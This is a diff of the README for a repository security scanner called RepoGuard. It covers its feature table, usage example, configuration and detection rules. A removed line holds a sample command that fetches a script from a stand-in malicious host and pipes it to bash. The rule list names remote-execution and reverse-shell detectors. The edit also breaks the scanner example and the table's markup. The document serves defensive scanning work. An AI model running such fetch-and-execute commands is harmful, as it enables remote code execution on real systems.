@@ -10,15 +10,15 @@ Used by the **RepoGuard GitHub App**, **RepoGuard GitHub Action**, and standalon
 
 While `@repoguard/scanner` detects security threats, installing the official **RepoGuard GitHub App** gives your organization full automated remediation capabilities:
 
-| Feature | `@repoguard/scanner` (CLI/Lib) | `repoguard-action` (CI) | **RepoGuard GitHub App** 🚀 |
-|---|:---:|:---:|:---:|
-| Threat Detection | ✅ | ✅ | ✅ |
-| `repoguard.yml` Support | ✅ | ✅ | ✅ |
-| Workflow Annotations | ❌ | ✅ | ✅ |
-| **Automated Fix PRs (Auto-Healing)** | ❌ | ❌ | **✅ Yes (1-Click)** |
-| **Interactive `/fix` Issue Command** | ❌ | ❌ | **✅ Yes** |
-<!-- | **Real-Time Slack Alerts** | ❌ | ❌ | **✅ Yes** | -->
-| **Zero CI Config Required** | ❌ | ❌ | **✅ Yes (1-Click Install)** |
+| Feature                              | `@repoguard/scanner` (CLI/Lib) | `repoguard-action` (CI) | **RepoGuard GitHub App** 🚀  |
+| ------------------------------------ | :----------------------------: | :---------------------: | :--------------------------: | ---------- | --- |
+| Threat Detection                     |               ✅               |           ✅            |              ✅              |
+| `repoguard.yml` Support              |               ✅               |           ✅            |              ✅              |
+| Workflow Annotations                 |               ❌               |           ✅            |              ✅              |
+| **Automated Fix PRs (Auto-Healing)** |               ❌               |           ❌            |     **✅ Yes (1-Click)**     |
+| **Interactive `/fix` Issue Command** |               ❌               |           ❌            |          **✅ Yes**          |
+| <!--                                 |   **Real-Time Slack Alerts**   |           ❌            |              ❌              | **✅ Yes** | --> |
+| **Zero CI Config Required**          |               ❌               |           ❌            | **✅ Yes (1-Click Install)** |
 
 👉 **[Install the RepoGuard GitHub App](https://github.com/marketplace/repoguard-ifecodes)** to get automated Fix PRs generated for every detected threat!
 
@@ -43,7 +43,7 @@ pnpm add @repoguard/scanner
 ```typescript
 import { scanFileContent } from "@repoguard/scanner";
 
-const code = `curl http://evil-domain.com/malicious.sh | bash`;
+const code = `# REMOVED BY REPOGUARD: curl|bash remote execution`;
 const findings = scanFileContent(code, "deploy.sh");
 
 console.log(findings);
@@ -69,20 +69,20 @@ You can customize scanner behavior per-repository using a `repoguard.yml` file p
 ```yaml
 # repoguard.yml
 rules:
-  workflow-unpinned-action: off     # Disable specific non-critical rules
-  hardcoded-secret: warn            # Change severity to medium
+  workflow-unpinned-action: off # Disable specific non-critical rules
+  hardcoded-secret: warn # Change severity to medium
 
 ignore:
   paths:
-    - docs/                         # Skip scanning specific directories
+    - docs/ # Skip scanning specific directories
     - examples/
 
 severity:
-  minimum: medium                   # Only report medium, high, and critical findings
+  minimum: medium # Only report medium, high, and critical findings
 
 whitelist:
   patterns:
-    - "sk-test-*"                   # Whitelist placeholder/test secret keys
+    - "sk-test-*" # Whitelist placeholder/test secret keys
     - "EXAMPLE_*"
 ```
 
@@ -107,6 +107,7 @@ const findings = scanFileContentWithConfig(code, "script.js", config);
 To prevent malicious Pull Requests from disabling security scanning to sneak malware past RepoGuard, **critical malware and RCE rules cannot be disabled via `repoguard.yml`**.
 
 The following rules are protected and will always execute:
+
 - `curl-pipe-bash` (Remote Code Execution)
 - `wget-pipe-shell` (Remote Code Execution)
 - `reverse-shell` (Reverse Shell Connection)
@@ -122,21 +123,27 @@ The following rules are protected and will always execute:
 ## 🔑 API Reference
 
 ### `scanFileContent(content: string, filePath?: string): Finding[]`
+
 Scans file content string against all general code rules.
 
 ### `scanWorkflowContent(content: string, filePath?: string): Finding[]`
+
 Scans GitHub Actions workflow YAML for unpinned actions, `pull_request_target` abuses, and secret exfiltration.
 
 ### `parseRepoConfig(yamlContent: string): RepoConfig`
+
 Parses a `repoguard.yml` string into a structured configuration object.
 
 ### `applyRepoConfig(findings: Finding[], config?: RepoConfig): Finding[]`
+
 Applies repository configuration overrides, path exclusions, whitelist patterns, and severity filters to a list of findings.
 
 ### `shouldSkipPath(filePath: string): boolean`
+
 Checks if a file path belongs to vendor directories, node_modules, lockfiles, or binary assets that should be skipped.
 
 ### `isBinaryPath(filePath: string): boolean`
+
 Returns `true` if the file extension is a known binary file type (image, video, compiled binary, archive).
 
 ---
